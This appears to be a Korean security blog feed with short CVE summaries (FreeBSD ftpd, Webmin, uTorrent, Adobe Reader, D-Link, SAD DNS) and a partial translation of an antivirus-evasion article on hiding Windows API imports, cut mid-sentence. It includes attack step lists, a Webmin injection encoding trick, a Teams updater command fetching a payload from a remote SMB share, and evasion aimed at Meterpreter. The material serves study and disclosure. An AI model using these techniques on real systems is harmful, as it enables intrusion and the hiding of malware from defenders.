    <title>[하루한줄] CVE-2020-7468: FreeBSD local privilege escalation</title>
    <link href="/2020/12/29/l0ch/2020-12-29/"/>
    <url>/2020/12/29/l0ch/2020-12-29/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.zerodayinitiative.com/blog/2020/12/21/cve-2020-7468-turning-imprisonment-to-advantage-in-the-freebsd-ftpd-chroot-jail">CVE-2020-7468: TURNING IMPRISONMENT TO ADVANTAGE IN THE FREEBSD FTPD CHROOT JAIL</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>FreeBSD ftpd</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>FreeBSD의 ftp 데몬에서 root 로 권한 상승이 가능한 취약점이 발견되었습니다.</p><p>취약점은 <code>chroot</code> 함수의 로그인 처리 부분의 결함으로 인해 발생합니다.</p><p><code>chroot</code> 함수에서 <code>chdir</code>이 실패할 경우 ftpd는 <code>chroot</code>의 jail에서 새로운 로그인 연결을 기다립니다. 이를 이용해 강제로 <code>chdir</code>이 실패하도록 유도하면 해커가 업로드한 파일을 시스템 파일인 것처럼 속일 수 있습니다.</p><p>취약점의 상세 공격 단계는 다음과 같습니다.</p><ol><li>해커가 FTP 유저 계정으로 로그인합니다.</li><li><code>etc/spwd.db</code> 에 임의의 root 패스워드를 설정해 업로드합니다.</li><li><code>chmod 0</code> 으로 홈 디렉터리에 대한 권한을 변경하고 유저 계정으로 다시 로그인합니다.</li><li>3번으로 인해 로그인 중 <code>chdir</code>이 실패하고 <code>ftpd chroot jail</code> 내부에서 새로운 연결을 기다립니다. 이후 모든 시스템 파일 액세스는 해커 계정의 홈 디렉터리를 기준으로 이루어집니다.</li><li>결과적으로 이후 root로 로그인할 때 해커가 업로드한 <code>etc/spwd.db</code> 의 root 패스워드 테이블을 참조해 패스워드를 검증하고 해커가 root 계정에 접근할 수 있습니다.</li></ol><p>해당 취약점을 악용하면 리버스쉘을 실행시키는 명령어를 포함한 파일을 업로드해 root 권한으로 쉘을 실행하고, chroot jail을 벗어나 임의의 명령어 또한 실행할 수 있습니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>lpe</tag>
      
      <tag>L0ch</tag>
      
      <tag>FreeBSD</tag>
      
      <tag>local privilege escalation</tag>
      
      <tag>ftpd</tag>
      
      <tag>chroot</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-35606: Arbitrary Command Execution in Webmin</title>
    <link href="/2020/12/28/idioth/2020-12-28/"/>
    <url>/2020/12/28/idioth/2020-12-28/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.pentest.com.tr/exploits/Webmin-1962-PU-Escape-Bypass-Remote-Command-Execution.html">Webmin-1962-PU-Escape-Bypass-Remote-Command-Exectuion</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Wemin 1.962 이하 버전</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Webmin에서 Remote Command Execution 취약점이 발견되었습니다. 해당 취약점을 통해 패키지 업데이트 모듈을 사용할 수 있는 모든 유저가 root 권한으로 arbitrary command를 실행할 수 있습니다. <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-12840">CVE-2019-12840</a>에 대한 필터링은 package name 변수가 system command 안에 직접적으로 들어가므로 URL encoding을 통해 우회할 수 있습니다.(ex. command line을 한 줄 아래에서 실행)</p><p><code>u</code> 파라미터는 <code>update.cgi</code>에서 <code>@pkgs</code> 변수에 들어가서 여러 연산을 수행합니다. <code>update.cgi</code>의 함수들은 <code>package-updates-lib.pl</code>에서 호출되는데, 그중 <code>package_install(package-name, [system], [new-install])</code>은 update system이나 Wemin을 통해 패키지를 설치할 수 있고 업데이트된 패키지 목록을 반환합니다.</p><p>패지키를 설치할 때 CVE-2019-12840에 대한 조치로 <code>s/\\(-)|\\(.)/string/g;</code> 필터링이 걸려있습니다. 패키지 이름은 http request 변수이므로 <code>%0a</code>나 <code>%0c</code> 등을 통해 escape가 가능합니다. 패키지 이름 뒤에 <code>%7c</code> 등으로 pipe나 <code>.</code>을 추가하면 그 부분에 <code>\</code> 백 슬래시가 추가되어 명령 실행이 불가능하지만 <code>%0a%7c</code> 등으로 새로운 command line에서 실행하면 <code>\</code>가 무시되고 정상적으로 arbitrary command execution이 가능합니다.</p><p><a href="https://pentest.com.tr/blog/webmin_pu_escape_bypass_rce.rb">해당 취약점에 대한 Metasploit code</a></p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>idioth</tag>
      
      <tag>command execution</tag>
      
      <tag>cve-2019-12840</tag>
      
      <tag>webmin</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-8437: uTorrent vulnerability, misparse to RCE</title>
    <link href="/2020/12/19/fabu1ous/2020-12-19/"/>
    <url>/2020/12/19/fabu1ous/2020-12-19/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://blog.whtaguy.com/2020/09/utorrent-cve-2020-8437-vulnerability.html">CVE-2020-8437 Vulnerability And Exploit Overview</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>uTorrent &lt;= 3.5.5</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>CVE-2020-8437은 uTorrent의 peer끼리 주고받는 BitTorrent protocol에서 발견된 취약점입니다. BitTorrent protocol을 시작하는 Handshake 페킷에는 bencoded dictionary를 담고 있는 <code>M field</code>가 존재합니다.</p><p>bencoded dictionary는 python dictionary와 매우 유사하며 Key와 Value를 갖습니다. 여기서 중요한 점은 nested(중첩된) dictionary의 존재인데, 즉 Value가 또 다른 하나의 dictionary가 될 수 있습니다. 중첩된 dictionary를 파싱하는 과정에서 발생하는 취약점입니다.</p><pre><code class="hljs Bencoded">d4:keyA 6:valueA4:keyBd5:apple 3:pie6:orange 5:juiceee</code></pre><p>충접된 dictionary를 파싱 할 때 몇 번째 layer에서 파싱하고 있는지를 32bit 크기의 <code>bit field</code>에 기록합니다. layer를 하나 들어갈 때마다 이 bit field에 한 비트씩 플래그를 설정합니다( ex. 2번째 layer 파싱 중 : 0000 0000 0000 0011 ). 만약 layer가 32보다 많이 중첩된 dictionary를 파싱하게 된다면 Crash가 발생합니다.</p><p>malicious bencoded dictionary를 담은 <code>.torrent</code>를 받는 peer의 uTorrent는 nested dictionary를 파싱하는 과정에서 Crash가 발생하고 RCE까지 이어질 수 있습니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>rce</tag>
      
      <tag>utorrent</tag>
      
      <tag>misparse</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] Adobe Reader UAF vulnerability</title>
    <link href="/2020/12/18/l0ch/2020-12-18/"/>
    <url>/2020/12/18/l0ch/2020-12-18/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.zerodayinitiative.com/blog/2020/9/2/cve-2020-9715-exploiting-a-use-after-free-in-adobe-reader">CVE-2020-9715: EXPLOITING A USE-AFTER-FREE IN ADOBE READER</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Adobe Reader </p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Adobe Reader에서 원격 코드 실행까지 가능한 UAF 취약점이 발견되었습니다.</p><p><code>ESObjects</code> 는 Adobe Reader의 <code>EScript</code> 객체입니다. <code>ESObjects</code>를 구성할 때 해당 객체에 대한 포인터가 캐시에 저장됩니다. 동일한 PDDoc구조, 이름을 가진 <code>ESObject</code>를 구성할 때 새로 할당하는 대신 캐시의 <code>ESObject</code> 포인터가 사용되는데, 이때 UAF 취약점이 발생합니다.</p><p><code>ESObject</code>가 할당되고 객체 캐시에 추가될 때 <code>ESString type</code>은 ANSI입니다. 객체 캐시에서 <code>ESObject</code>를 삭제할 때 <code>ESString</code> 값으로 찾아 삭제하는데, 삭제할 항목을 검색할 때  UNICODE로 입력받아 <code>ESString</code> 항목을 찾지 못하게 됩니다. 결과적으로 <code>ESObject</code> 포인터는 삭제되지 않고, 이를 재사용할 수 있습니다.</p><p>해당 취약점은 ArrayBuffer byteLength corruption과 heap spray로 트리거해 RCE가 가능합니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>rce</tag>
      
      <tag>javascript</tag>
      
      <tag>L0ch</tag>
      
      <tag>uaf</tag>
      
      <tag>adobe reader</tag>
      
      <tag>heap spray</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] Microsoft Teams Updater Living off the Land</title>
    <link href="/2020/12/17/idioth/2020-12-17/"/>
    <url>/2020/12/17/idioth/2020-12-17/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/microsoft-teams-updater-living-off-the-land/">Microsoft Teams Updater Living off the Land</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>MS Teams Updater</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Microsoft Teams의 업데이트 프로그램을 lolbas(Living off the land binary and script)로 사용할 수 있습니다. 이전에 존재하던 code execution에 대한 취약점 수정은 URL을 통하여 업데이트 기능을 제한하는 것입니다. 하지만 업데이트 프로그램은 제품 업데이트를 위해 공유/로컬 폴더를 통한 로컬 연결이 가능합니다. 따라서 원격 SMB 공유 폴더를 통해 해당 패치를 우회할 수 있습니다.</p><p>이 취약점을 악용하기 위한 payload를 작성하는 단계는 다음과 같습니다.</p><ol><li><p><code>%localappdata%\Microsoft\Teams\packages</code>에서 Microsoft Teams pre-built package를 통해 nupkg 패키지 추출(ex. Teams-1.3.00.27559-full.nupkg)</p></li><li><p><code>Teams-1.3.00.27559-full.nupkg\lib\net45</code>에 shellcode를 <code>squirrel.exe</code> 파일로 넣은 후 압축</p></li><li><p>metadata 계산</p><p><code>sha1sum Teams-1.3.00.27559-full.nupkg.nupkg &amp;&amp; wc -c &lt; Teams-1.3.00.27559-full.nupkg</code></p><p>output:</p><p><code>fa8b87f0b995498a6e890c832dcaf968997608d4 Teams-1.3.00.27559-full.nupkg 4695</code></p></li><li><p><code>RELEASES</code> 파일을 생성한 후 위의 결과 값을 복사해서 저장</p></li><li><p><code>Teams-1.3.00.27559-full.nupkg</code>와 <code>RELEASES</code> 파일을 메인 디렉터리에 넣고 원격 SMB 서버에 업로드</p></li></ol><p>피해자가 아래 명령어를 통해 해커의 원격 SMB 서버로 update를 진행하면 Microsoft Teams에 의해 다운로드되고 실행됩니다.</p><pre><code class="hljs taggerscript"><span class="hljs-variable">%localappdata%</span><span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\T</span>eams<span class="hljs-symbol">\u</span>pdate.exe --update = <span class="hljs-symbol">\\</span> remoteserver<span class="hljs-symbol">\p</span>ayloadFolder</code></pre>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>microsoft</tag>
      
      <tag>idioth</tag>
      
      <tag>lolbin</tag>
      
      <tag>lolbas</tag>
      
      <tag>teams</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] Qualcomm DSP Achilles</title>
    <link href="/2020/12/16/fabu1ous/2020-12-16/"/>
    <url>/2020/12/16/fabu1ous/2020-12-16/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://blog.checkpoint.com/2020/08/06/achilles-small-chip-big-peril/#:~:text=One%20of%20the%20most%20common,the%20leading%20manufacturers%3A%20Qualcomm%20Technologies">Qualcomm DSP Achilles</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Qualcomm DSP chip</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Checkpoint는 올해 Defcon에서 Achilles라는 연구 논문을 발표했습니다. Achilles는 Qualcomm DSP( Digital Signal Processor ) 칩에서 400개 이상의 취약점을 찾은 퍼징 기술 연구입니다. Qualcomm은 다양한 칩들을 생산하는 회사로, 스마트폰 시장의 40%가 Qualcomm의 칩을 사용하고 있기 때문에 Achilles에 주목해볼 필요가 있습니다.</p><p>DSP 칩들은 기본적으로 Black box로 관리되기 때문에, manufacturer가 아니라면 DSP 칩에 대한 정보가 제한적일 수밖에 없습니다. 이 칩을 사용해 스마트폰을 만드는 제조사도 예외는 아닙니다. Checkpoint는 black box 때문에 스마트폰 제조사들이 신속하게 이슈를 고치지 못하는 상황을 지적했습니다.</p><p>올해 5월 Zerodium이 ios exploit의 제보가 너무 많다는 이유로 구매 중지를 선언했습니다. Open source인 Android 보다 취약점 제보 건수가 많다는 것을 근거로 Closed source(black box)를 유지하던 ios의 보안성은 더 이상 효과 없다는 의견이 있습니다. ios 뿐만 아니라 모든 black box의 의미가 점점 희미해지고 있는 거 같습니다.</p><p>헤커들에겐 black box의 정보 폐쇄 효과는 점점 옅어지고, vendor 입장에선 이슈를 고치지 힘든 상황이 맞물려 Achilles 연구처럼 취약점이 뭉텅이로 나오는 일이 발생했다고 볼 수 있습니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>qualcomm</tag>
      
      <tag>dsp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-8863/8864 D-LINK ROUTER AUTHENTICATION BYPASSES</title>
    <link href="/2020/12/15/l0ch/2020-12-15/"/>
    <url>/2020/12/15/l0ch/2020-12-15/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.zerodayinitiative.com/blog/2020/9/30/the-anatomy-of-a-bug-door-dissecting-two-d-link-router-authentication-bypasses">THE ANATOMY OF A BUG DOOR: DISSECTING TWO D-LINK ROUTER AUTHENTICATION BYPASSES</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>D-LINK router</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>HNAP (Home Network Administration Protocol)는 Pure Networks Inc. 에서 개발 한 독점 SOAP 기반 프로토콜입니다. 현재는 이 프로토콜의 사용이 중단되었지만 여전히 업데이트되지 않은 많은 라우터들이 해당 프로토콜을 사용하고 있습니다.</p><p>HNAP에서 발견된 두 가지 취약점은 다음과 같습니다.</p><p>CVE-2020-8863은 <code>LoginPassword</code> 검증 과정에서 발생하는 authentication bypass 취약점입니다. <code>strncmp()</code> 에서 db 패스워드와 클라이언트가 입력한 <code>LoginPassword</code>를 <code>LoginPassword</code>의 size 만큼 비교하는데, 이때 <code>LoginPassword</code>에 빈 값을 전달하면 비교할 size가 0이 되어 무조건 인증에 성공하게 됩니다.</p><p>CVE-2020-8864는 HNAP PrivateLogin 인증 알고리즘의 잘못된 구현으로 인해 발생하는 authentication bypass 취약점입니다. HNAP를 통해 인증할 때 서버는 일반적으로 Private key를 사용자의 암호를 기반으로 생성합니다. 그러나 로그인 요청 중 <code>PrivateLogin</code> 필드에 “Username” 값을 넣어 요청하면 “Username”값으로 Private key를 생성해  실제 관리자 암호를 몰라도 인증 챌린지 값을 알 수 있습니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>authentication bypass</tag>
      
      <tag>L0ch</tag>
      
      <tag>router</tag>
      
      <tag>bug-door</tag>
      
      <tag>d-link</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] Windows Server DNS Resolver Spoofing 취약점 권고</title>
    <link href="/2020/12/14/idioth/2020-12-14/"/>
    <url>/2020/12/14/idioth/2020-12-14/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://dirteam.com/sander/2020/12/10/dns-spoofing-vulnerability-sad-dns-important-cve-2020-25705-adv200013/">Spoofing Vulnerability in DNS Resolver (SAD DNS, Important, CVE-2020-25705, ADV200013)</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Windows Server 2008 R2</li><li>Windows Server 2012</li><li>Windows Server 2012 R2</li><li>Windows Server 2016</li><li>Windows Server 2019</li><li>Windows Server, version 1903</li><li>Windows Server, version 1909</li><li>Windows Server, version 2004</li><li>Windows Server, version 20H2</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>2020년 12월 8일에 마이크로소프트에서 DNS Resolver addressing spoofing 취약점에 대한 보안 공지(<a href="https://msrc.microsoft.com/update-guide/vulnerability/ADV200013">ADV200013</a>)가 발표됐습니다. 마이크로소프트는 해당 취약점을 통한 DNS cache poisoning attack을 막기 위해 DNS UDP 패킷의 크기를 제한하는 권고를 했습니다.</p><p>해당 취약점은 Windows TCP/IP stack에 제공되는 DNS Resolver Component에 존재합니다. DNS Resolver에 영향을 미치는 IP 조각화에 의해 DNS cache poisoning 취약점이 발생하며 해당 취약점을 exploit 한 해커는 DNS forwarder나 DNS Resolver에 의해 cache 된 DNS packet을 스푸핑 할 수 있습니다. 취약점을 성공적으로 exploit 하면 해커는 수정된 DNS record를 사용하여 해커의 웹사이트로 redirect 시킬 수 있습니다.</p><p>해당 취약점을 방지하기 위해 <code>MaximumUdpPacketSize</code> 레지스트리 값을 1,221 bytes로 수정해야 합니다. 수정된 후 DNS Resolver는 1,221 bytes보다 큰 모든 response를 TCP로 받아서 Windows Server 기반 DNS server에서 해당 취약점을 악용하려는 시도를 막을 수 있습니다.</p><p>DNS server가 실행되는 모든 Windows Server에서 관리자 권한 파워 쉘이나 원격 세션을 통한 아래의 명령줄을 실행하면 UDP 패킷 크기의 레지스트리 값을 변경할 수 있습니다.</p><pre><code class="hljs powershell"><span class="hljs-variable">$RegPath</span> = <span class="hljs-string">&quot;HKLM:\System\CurrentControlSet\Services\DNS\Parameters&quot;</span><span class="hljs-built_in">New-ItemProperty</span> <span class="hljs-literal">-Path</span> <span class="hljs-variable">$RegPath</span> <span class="hljs-literal">-Name</span> MaximumUdpPacketSize `<span class="hljs-literal">-Value</span> <span class="hljs-number">1221</span> <span class="hljs-literal">-PropertyType</span> DWORD <span class="hljs-literal">-Force</span><span class="hljs-built_in">Restart-Service</span> DNS</code></pre>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>windows server</tag>
      
      <tag>idioth</tag>
      
      <tag>sad dns</tag>
      
      <tag>dns cache poisoning</tag>
      
      <tag>dns resolver</tag>
      
      <tag>adv200013</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Translation] Engineering Antivirus evasion Part.2</title>
    <link href="/2020/12/13/idioth/av_evasion_part2/"/>
    <url>/2020/12/13/idioth/av_evasion_part2/</url>
    
    <content type="html"><![CDATA[<p>저번에 올렸던 Engineering Antivirus evasion를 이어서 Part 2의 번역본도 들고 왔습니다.</p><p>저번의 발 번역에 이어서 이번에도 의역과 오역이 난무하는 글이므로 글이 이해가 안 되시거나 얘가 왜 이렇게 썼는지 이해가 안 되시는 부분이 있으시면 바로 지적해주시기 바랍니다!</p><blockquote><p>원문글 : <a href="https://blog.scrt.ch/2020/07/15/engineering-antivirus-evasion-part-ii/">Engineering antivirus evasion (Part II)</a></p></blockquote><p><strong>tl;dr</strong> 소프트웨어는 Windows 운영 체제와 상호 작용하기 위해 동적 링크 라이브러리(DLL)를 통해 함수를 가져온다. 이 함수들은 Import Address Table 테이블에 평문으로 작성되고 안티바이러스 소프트웨어는 이를 활용하여 악의적인 활동을 탐지한다. 우리는 Meterpreter를 중심으로 C/C++ 소프트웨어를 refactoring 하여 이러한 footprint를 제거할 수 있는 난독화 아이디어와 구현을 보여준다. 소스 코드는 <a href="https://github.com/scrt/avcleaner">https://github.com/scrt/avcleaner</a>에서 확인할 수 있다.</p><h2 id="소개"><a href="#소개" class="headerlink" title="소개"></a>소개</h2><p>이전 글에서 정규식을 사용하지 않고 소스 코드에서 문자열 리터럴을 바꾸는 방법을 보여줬다. 바이너리의 footprint를 줄이고 정적 시그니처에 의존하는 보안 소프트웨어를 우회하는 것이 목적이다.</p><p>그러나 소스 코드의 문자열 리터럴 말고도 정적으로 수집하고 분석할 수 있는 정보들이 많다. 이 글은 바이너리에서 API import를 숨기는 방법과 C/C++로 작성된 모든 소프트웨어에서 그 작업을 자동화하는 방법에 대해서 다룰 것이다.</p><h2 id="API-imports의-문제점"><a href="#API-imports의-문제점" class="headerlink" title="API imports의 문제점"></a>API imports의 문제점</h2><p>간단한 C 프로그램을 아래와 같이 작성하고 빌드하자</p><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>** argv)</span> </span>&#123;     MessageBox(<span class="hljs-literal">NULL</span>, <span class="hljs-string">&quot;Test&quot;</span>, <span class="hljs-string">&quot;Something&quot;</span>, MB_OK);    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><p>그리고 가장 좋아하는 컴파일러로 빌드해라. MinGW는 <em>macOS</em>에서 <em>Windows</em>로 크로스 빌드를 하는 데 사용된다.</p><pre><code class="hljs bash">x86_64-w64-mingw32-gcc test.c -o /tmp/toto.exe</code></pre><p>그 후에 rabin2(radare2에 포함되어 있음) 또는 GNU strings 유틸리티를 사용하여 문자열을 리스트 할 수 있다.</p><pre><code class="hljs bash">rabin2 -zz /tmp/toto.exe | bat</code></pre><pre><code class="hljs bash"> 205   │ 201  0x00003c92 0x00408692 7   8    .idata        ascii   strncmp 206   │ 202  0x00003c9c 0x0040869c 8   9    .idata        ascii   vfprintf 207   │ 203  0x00003ca8 0x004086a8 11  12   .idata        ascii   MessageBoxA 208   │ 204  0x00003d10 0x00408710 12  13   .idata        ascii   KERNEL32.dll 209   │ 205  0x00003d84 0x00408784 10  11   .idata        ascii   msvcrt.dll 210   │ 206  0x00003d94 0x00408794 10  11   .idata        ascii   USER32.dll...9557   │ 9553 0x0004f481 0x00458e81 30  31                 ascii   .refptr.__native_startup_state9558   │ 9554 0x0004f4a0 0x00458ea0 11  12                 ascii   __ImageBase9559   │ 9555 0x0004f4ac 0x00458eac 11  12                 ascii   MessageBoxA9560   │ 9556 0x0004f4b8 0x00458eb8 12  13                 ascii   GetLastError9561   │ 9557 0x0004f4c5 0x00458ec5 17  18                 ascii   __imp_MessageBoxA9562   │ 9558 0x0004f4d7 0x00458ed7 23  24                 ascii   GetSystemTimeAsFileTime9563   │ 9559 0x0004f4ef 0x00458eef 22  23                 ascii   mingw_initltssuo_force9564   │ 9560 0x0004f506 0x00458f06 19  20                 ascii   __rt_psrelocs_start</code></pre><p>이 함수를 <code>User32.dll</code> 라이브러리에서 가져와야 하므로 MessageBoxA 문자열은 3번 나타난다.(뒤에서 자세히 설명)</p><p>MessageBoxA 문자열은 안티바이러스에서 감지되지 않지만 다음 API들은 감지될 것이다.</p><ul><li>InternetReadFile</li><li>ShellExecute</li><li>CreateRemoteThread</li><li>OpenProcess</li><li>ReadProcessMemory</li><li>WriteProcessMemory</li><li>…</li></ul><h2 id="API-imports-숨기기"><a href="#API-imports-숨기기" class="headerlink" title="API imports 숨기기"></a>API imports 숨기기</h2><p>윈도우 시스템에서 개발자들이 외부 라이브러리 함수를 호출하는 데 사용할 수 있는 방법들은 다음과 같다.</p><ul><li>Load-time dynamic linking</li><li>Run-time dynamic linking</li></ul><h3 id="Load-time-dynamic-linking"><a href="#Load-time-dynamic-linking" class="headerlink" title="Load-time dynamic linking"></a>Load-time dynamic linking</h3><p>외부 라이브러리 함수를 호출하는 기본적인 방법이며 링커에 의해 자동적으로 처리된다. 빌드 사이클 동안 애플리케이션은 각 동적 링크 라이브러리(DLL)의 import library(.lib)에 연결된다. 가져온 각 함수에 대해 링커는 DLL에 대한 내용을 IAT에 엔트리를 작성한다.</p><p>애플리케이션이 시작될 때, 운영체제는 IAT를 탐색하여 프로세스의 주소 공간에 있는 모든 라이브러리 리스트를 매핑하고 가져온 각 함수의 주소는 DLL의 Export Address Table에 해당 엔트리를 가리키도록 업데이트된다.</p><p><img src="/2020/12/13/idioth/av_evasion_part2/0.png"></p><p>Import Address Table (IAT)</p><h3 id="Run-time-dynamic-linking"><a href="#Run-time-dynamic-linking" class="headerlink" title="Run-time dynamic linking"></a>Run-time dynamic linking</h3><p>다른 방법은 LoadLibrary로 해당 라이브러리를 로드한 후 GetProcAddress로 함수의 주소를 얻어 수동적으로 수행하는 것이다. 예를 들어 위의 예시를 run-time dynamic linking을 적용할 수 있다.</p><p>먼저 MessageBoxA API의 함수 포인터를 정의해야 한다. 시작하기 전에 C의 함수 포인터 구문에 대해 간단하게 설명한다.</p><pre><code class="hljs cpp">&lt;<span class="hljs-keyword">return</span> type&gt; (*&lt;your pointer name&gt;)(arg1, arg2, ...);</code></pre><p>볼 수 있듯이 star operator(함수 포인터이므로)와  괄호를 제외하면 함수를 정의하는 구문과 같다.</p><p>이제 MessageBox의 프로토타입이 필요한데 Windows SDK의 <code>winuser.h</code> 혹은 <a href="https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-messagebox">MSDN</a>에서 찾을 수 있다.</p><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">MessageBox</span><span class="hljs-params">(</span></span><span class="hljs-function"><span class="hljs-params">  HWND    hWnd,</span></span><span class="hljs-function"><span class="hljs-params">  LPCTSTR lpText,</span></span><span class="hljs-function"><span class="hljs-params">  LPCTSTR lpCaption,</span></span><span class="hljs-function"><span class="hljs-params">  UINT    uType</span></span><span class="hljs-function"><span class="hljs-params">)</span></span>;</code></pre><p>앞서 말한 함수 포인터 구문은 정확한 정보로 업데이트할 수 있다.</p><pre><code class="hljs cpp"><span class="hljs-keyword">int</span> (*_MessageBoxA)(    HWND hWnd,    LPCTSTR lpText,    LPCTSTR lpCaption,    UINT uType);</code></pre><p>MSDN은 이 함수가 <code>User32.dll</code>에서 내보내진 다고 설명한다.</p><p><img src="/2020/12/13/idioth/av_evasion_part2/1.png"></p><p>MessageBoxA API는 <code>User32.dll</code>에서 내보내 진다. 따라서 애플리케이션은 이 라이브러리를 먼저 로드해야 한다.</p><pre><code class="hljs cpp">HANDLE hUser32 = LoadLibrary(<span class="hljs-string">&quot;User32.dll&quot;</span>);</code></pre><p>그 후 <code>GetProcAddress</code>를 사용하여 위에서 정의한 함수 포인터에 정확한 주소를 할당할 수 있다.</p><pre><code class="hljs cpp">_MessageBoxA fMessageBoxA = (_MessageBoxA) GetProcAddress(hUser32, <span class="hljs-string">&quot;MessageBoxA&quot;</span>);</code></pre><p>여기서 원래 예를 <code>MessageBoxA</code> 대신 <code>fMessageBoxA</code>를 호출하도록 수정해야 하며 다음과 같다.</p><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">int</span> <span class="hljs-params">(*_MessageBoxA)</span><span class="hljs-params">(</span></span><span class="hljs-function"><span class="hljs-params">  HWND    hWnd,</span></span><span class="hljs-function"><span class="hljs-params">  LPCTSTR lpText,</span></span><span class="hljs-function"><span class="hljs-params">  LPCTSTR lpCaption,</span></span><span class="hljs-function"><span class="hljs-params">  UINT    uType</span></span><span class="hljs-function"><span class="hljs-params">)</span></span>;<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>** argv)</span> </span>&#123;    HANDLE hUser32 = LoadLibraryA(<span class="hljs-string">&quot;User32.dll&quot;</span>);    _MessageBoxA fMessageBoxA = (_MessageBoxA) GetProcAddress(hUser32, <span class="hljs-string">&quot;MessageBoxA&quot;</span>);    fMessageBoxA(<span class="hljs-literal">NULL</span>, <span class="hljs-string">&quot;Test&quot;</span>, <span class="hljs-string">&quot;Something&quot;</span>, MB_OK);    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><p><code>HWND, LCTSTR, UINT</code> 데이터 타입을 위해 <code>Windows.h</code> include가 필요하다. 이 간단한 예제를 빌드하고 실행하면 예상대로 alert box가 실행된다.</p><p><img src="/2020/12/13/idioth/av_evasion_part2/2.png"></p><p>run-time dynamic linking을 하기 위해 <code>LoadLibrary</code>와 <code>GetProcAddress</code>을 사용하는 간단한 예시</p><h3 id="최종-적용"><a href="#최종-적용" class="headerlink" title="최종 적용"></a>최종 적용</h3><p><code>strings toto.exe</code>를 실행하면 아직 <code>User32.dll</code>과 <code>MessageBoxA</code> 문자열이 